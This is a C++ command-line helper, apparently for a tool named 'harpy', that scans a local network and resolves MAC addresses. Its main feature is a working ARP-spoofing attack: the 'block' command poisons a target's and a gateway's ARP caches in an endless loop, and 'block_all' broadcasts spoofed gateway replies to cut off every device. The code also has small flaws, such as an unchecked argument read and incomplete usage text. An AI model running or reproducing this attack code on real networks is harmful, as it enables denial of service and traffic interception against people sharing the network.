#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include "network_scan.h"
#include "arp_operations.h"

void print_usage(const char* prog) {
    std::cerr << "Usage: " << prog << " <command> [args...]" << std::endl;
    std::cerr << "Commands:" << std::endl;
    std::cerr << "  scan <interface> <subnet_prefix>    Scan network" << std::endl;
    std::cerr << "  mac <interface> <ip>               Get MAC for IP" << std::endl;
    std::cerr << "  block <interface> <target_ip> <gateway_ip> <our_mac>" << std::endl;
}

int main(int argc, char* argv[]) {
    std::cout << "DEBUG: harpy_root_helper starting..." << std::endl;
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    std::string command = argv[1];

    if (command == "scan") {
        if (argc < 4) {
            std::cerr << "Error: scan requires interface and subnet_prefix" << std::endl;
            return 1;
        }
        
        const char* iface = argv[2];
        const char* subnet = argv[3];
        int timeout = 10; // Default to 10 seconds for robustness
        if (argc >= 5) {
            timeout = std::stoi(argv[4]);
        }

        network_scan_init();
        std::vector<std::string> devices = network_scan(iface, subnet, timeout);
        
        std::cout << "DEBUG: Scan finished. Discovered " << devices.size() << " devices." << std::endl;
        for (const auto& dev : devices) {
            std::cout << dev << std::endl;
        }
    } 
    else if (command == "mac") {
        if (argc < 4) {
            std::cerr << "Error: mac requires interface and ip" << std::endl;
            return 1;
        }

        const char* iface = argv[2];
        const char* ip = argv[3];

        arp_init();
        std::string mac = arp_get_mac(ip, iface);
        if (!mac.empty()) {
            std::cout << mac << std::endl;
        } else {
            return 1;
        }
    }
    else if (command == "block") {
        if (argc < 6) {
            print_usage(argv[0]);
            return 1;
        }
        const char* iface = argv[2];
        const char* target_ip = argv[3];
        const char* gateway_ip = argv[4];
        const char* our_mac = argv[5];

        std::cout << "DEBUG: Blocking " << target_ip << " using gateway " << gateway_ip << std::endl;
        
        // 1. Resolve target MAC
        arp_init();
        std::string target_mac = arp_get_mac(target_ip, iface);
        if (target_mac.empty()) {
            std::cerr << "ERROR: Could not resolve MAC for target " << target_ip << std::endl;
            return 1;
        }
        std::cout << "DEBUG: Resolved target " << target_ip << " to " << target_mac << std::endl;

        // 2. Resolve gateway MAC (required for bidirectional spoofing)
        std::string gateway_mac = arp_get_mac(gateway_ip, iface);
        if (gateway_mac.empty()) {
            std::cerr << "WARNING: Could not resolve MAC for gateway " << gateway_ip << ". Blocking might be less effective." << std::endl;
        } else {
            std::cout << "DEBUG: Resolved gateway icon " << gateway_ip << " to " << gateway_mac << std::endl;
        }

        // 3. Continuous bidirectional spoofing loop
        std::cout << "BLOCK_STARTED: " << target_ip << std::endl;
        int count = 0;
        while (true) {
            // Tell target we are the gateway
            // "Target, the MAC for Gateway is [OurMac]"
            if (!arp_send_packet(iface, gateway_ip, our_mac, target_ip, target_mac.c_str(), false)) {
                std::cerr << "ERROR: Failed to send spoof packet to target" << std::endl;
            }
            
            // Tell gateway we are the target
            // "Gateway, the MAC for Target is [OurMac]"
            if (!gateway_mac.empty()) {
                if (!arp_send_packet(iface, target_ip, our_mac, gateway_ip, gateway_mac.c_str(), false)) {
                    std::cerr << "ERROR: Failed to send spoof packet to gateway" << std::endl;
                }
            }
            
            if (++count % 10 == 0) {
                std::cout << "DEBUG: Sent " << count << " spoofing packets..." << std::endl;
            }
            
            usleep(500000); // 500ms - more aggressive
        }
    }
    else if (command == "unblock") {
        if (argc < 7) {
            print_usage(argv[0]);
            return 1;
        }
        const char* iface = argv[2];
        const char* target_ip = argv[3];
        const char* target_mac = argv[4];
        const char* gateway_ip = argv[5];
        const char* gateway_mac = argv[6];

        std::cout << "DEBUG: Unblocking " << target_ip << " by restoring Gateway " << gateway_ip << "..." << std::endl;
        
        arp_init();
        // Send 5 restoration packets to ensure both sides update their cache
        for (int i = 0; i < 5; ++i) {
            // Restore Target's cache: "Gateway has [GatewayMac]"
            arp_send_packet(iface, gateway_ip, gateway_mac, target_ip, target_mac, false);
            // Restore Gateway's cache: "Target has [TargetMac]"
            arp_send_packet(iface, target_ip, target_mac, gateway_ip, gateway_mac, false);
            usleep(200000); 
        }
        std::cout << "UNBLOCK_FINISHED" << std::endl;
    }
    else if (command == "block_all") {
        if (argc < 4) {
            print_usage(argv[0]);
            return 1;
        }
        const char* iface = argv[2];
        const char* gateway_ip = argv[3];
        const char* our_mac = argv[4];

        std::cout << "DEBUG: NUCLEAR OPTION ACTIVATED. Blocking all devices by spoofing Gateway " << gateway_ip << std::endl;
        
        arp_init();
        std::cout << "BLOCK_ALL_STARTED" << std::endl;
        int count = 0;
        while (true) {
            // Tell EVERYONE (Broadcast) we are the gateway
            // "Everybody, the MAC for Gateway is [OurMac]"
            if (!arp_send_packet(iface, gateway_ip, our_mac, "255.255.255.255", "ff:ff:ff:ff:ff:ff", false)) {
                std::cerr << "ERROR: Failed to send broadcast spoof packet" << std::endl;
            }
            
            if (++count % 5 == 0) {
                std::cout << "DEBUG: Sent " << count << " broadcast spoofing packets..." << std::endl;
            }
            
            usleep(300000); // 300ms - very aggressive for broadcast
        }
    }
    else {
        std::cerr << "Unknown command: " << command << std::endl;
        print_usage(argv[0]);
        return 1;
    }

    return 0;
}
